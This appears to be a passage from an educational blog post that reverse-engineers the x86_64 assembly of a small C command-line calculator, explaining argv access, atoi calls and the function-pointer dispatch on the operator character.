<text text-anchor='middle' x='584' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='308' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='584' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='592' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='600' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='36' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='632' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='68' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='632' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='100' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='632' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='132' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='632' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='164' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='632' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='196' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='632' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='292' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='632' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='324' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='632' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='356' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='632' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='388' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='632' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='420' fill='currentColor' style='font-size:1em'>┤</text>
<text text-anchor='middle' x='632' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='632' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='648' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='308' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='648' y='340' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='648' y='372' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='648' y='404' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='656' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='308' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='656' y='340' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='656' y='372' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='656' y='404' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='664' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='308' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='664' y='340' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='664' y='372' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='664' y='404' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='672' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='308' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='672' y='340' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='672' y='372' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='672' y='404' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='680' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='308' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='680' y='340' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='680' y='372' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='680' y='404' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='688' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='308' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='688' y='340' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='688' y='372' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='688' y='404' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='696' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='308' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='696' y='340' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='696' y='372' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='696' y='404' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='704' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='308' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='704' y='340' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='704' y='372' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='704' y='404' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='712' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='308' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='712' y='340' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='712' y='372' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='712' y='404' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='720' y='116' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='720' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='720' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='720' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='720' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='720' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='720' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='720' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='720' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='720' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='720' y='276' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='720' y='308' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='720' y='340' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='720' y='372' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='720' y='404' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='728' y='308' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='728' y='340' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='728' y='372' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='728' y='404' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='736' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='736' y='340' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='736' y='372' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='736' y='404' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='744' y='308' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='744' y='340' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='744' y='372' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='744' y='404' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='752' y='308' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='752' y='340' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='752' y='372' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='752' y='404' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='760' y='308' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='760' y='340' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='760' y='372' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='760' y='404' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='768' y='308' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='768' y='340' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='768' y='372' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='768' y='404' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='776' y='308' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='776' y='340' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='776' y='372' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='776' y='404' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='784' y='308' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='784' y='340' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='784' y='372' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='784' y='404' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='800' y='340' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='800' y='372' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='800' y='404' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='816' y='340' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='816' y='372' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='816' y='404' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='824' y='372' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='824' y='404' fill='currentColor' style='font-size:1em'>4</text>
</g>

    </svg>
  
</div>
<p>Now with this in your mind, we can start to understand the above 3 instructions.</p>
<ul>
<li><code>mov     rax, QWORD PTR [rbp-48]</code></li>
</ul>
<p>This instruction loads the <code>some_pointer_value</code> into <code>rax</code> register.</p>
<ul>
<li><code>add     rax, 8</code></li>
</ul>
<p>This adds up <code>8</code> to <code>rax</code> value. That means now the resultant value is <code>some_pointer_value + 8</code>. If you don&rsquo;t know it already, <code>8</code> is the size of a pointer on most x86_64 machines. So if we want to add for 2 pointers, we&rsquo;ll need something like <code>some_pointer_value + 16</code>.</p>
<ul>
<li><code>mov     rax, QWORD PTR [rax]</code></li>
</ul>
<p>Now we load the value from that location. In C language, this would be equivalent to <code>*(argv + 1)</code> or <code>argv[1]</code> or if you are feeling funny <code>1[argv]</code>. <strong><a href="https://stackoverflow.com/questions/381542/with-arrays-why-is-it-the-case-that-a5-5a">HOW??</a></strong> <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<p>Now, next instruction calls <code>atoi</code> function with the <code>argv[1]</code> as it&rsquo;s first argument.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">atoi</span>
</span></span></code></pre></div><p><code>atoi</code> function changes character value to respective integer value. As an example, <code>'1'</code> (in char) will be converted to <code>1</code> (in int).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>
</span></span></code></pre></div><p>And then whatever is returned by that function will be stored in a local variable pointed by <code>rbp-12</code>. Remember, <code>eax</code> register is used to store the return values from called functions (<code>atio</code>) to caller function (<code>main</code>).</p>
<p>Next set of instructions is quite similar to what we just saw.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">atoi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">],</span> <span class="no">eax</span>
</span></span></code></pre></div><p>If you notice, here we are adding <code>24</code><em>(8 * 3 = 24)</em> so that means <code>arg3</code> is being used - <code>argv[3]</code>. Till this point we have successfully converted <code>argv[1]</code> and <code>argv[3]</code> to integers. These are the number1 and number2 values for our litte calculator.</p>
<p>Now <code>argv[2]</code>&hellip; our operator character&hellip; 1 byte value.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">movzx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-17</span><span class="p">],</span> <span class="no">al</span>
</span></span></code></pre></div><p>This adds <code>16</code> - means <code>argv[2]</code>. So we load the value and then just pick up the lowest 1 byte value <code>al</code> from the whole thing and store it in <code>[rbp-17]</code> location.</p>
<p>Let&rsquo;s update our C program with the new findings.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">num1</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">num2</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="kt">char</span> <span class="n">op</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="cm">/* Keep on going to know more */</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Next few lines of disassembly code looks like a conditional branch&hellip;. So many &ldquo;compare and jump&rdquo; instructions.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">        <span class="nf">movsx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-17</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">47</span>
</span></span><span class="line"><span class="cl">        <span class="nf">je</span>      <span class="no">.L12</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">47</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jg</span>      <span class="no">.L13</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">45</span>
</span></span><span class="line"><span class="cl">        <span class="nf">je</span>      <span class="no">.L14</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">45</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jg</span>      <span class="no">.L13</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">42</span>
</span></span><span class="line"><span class="cl">        <span class="nf">je</span>      <span class="no">.L15</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">43</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jne</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">addFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jmp</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L14:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">subFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jmp</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L15:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">mulFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jmp</span>     <span class="no">.L13</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L12:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:</span><span class="no">divFunc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span></code></pre></div><p>The value being compared is stored in <code>[rbp-17]</code> in this case. This contains the operator character from <code>argv[2]</code>. If you convert the values this is compared to to char equivalents, you&rsquo;ll get the following:</p>
<ul>
<li>47 is <code>/</code>,</li>
<li>45 is <code>-</code>,</li>
<li>42 is <code>*</code>, and</li>
<li>43 is <code>+</code>.</li>
</ul>
<p>With some calculations, you can conclude where the control will jump. To sum up,</p>
<ul>
<li>
<p>if the operator is 47 (<code>/</code>), then it&rsquo;ll jump to <code>.L12</code>. Which will move the offset location for <code>divFunc</code> function to a local variable.</p>
</li>
<li>
<p>if the operator is 45 (<code>-</code>), then it&rsquo;ll move offset location for <code>subFunc</code> function to that local variable.</p>
</li>
<li>
<p>if the operator is 42 (<code>*</code>), then it&rsquo;ll move offset location for <code>mulFunc</code> function to that local variable.</p>
</li>
<li>
<p>if the operator is 42 (<code>+</code>), then it&rsquo;ll move offset location for <code>addFunc</code> function to that local variable.</p>
</li>
<li>
<p>In any other given input, it&rsquo;ll simply move forward to <code>.L13</code>.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.L13:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rcx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">edx</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">rcx</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">movsx</span>   <span class="no">edx</span><span class="p">,</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-17</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">ecx</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">r8d</span><span class="p">,</span> <span class="no">esi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">leave</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Before reaching <code>.L13</code>, we have 4 variables in our program:-</p>
<ul>
<li>number1 - stored at <code>[rbp-12]</code></li>
<li>number2 - stored at <code>[rbp-16]</code></li>
<li>operator - stored at <code>[rbp-17]</code></li>
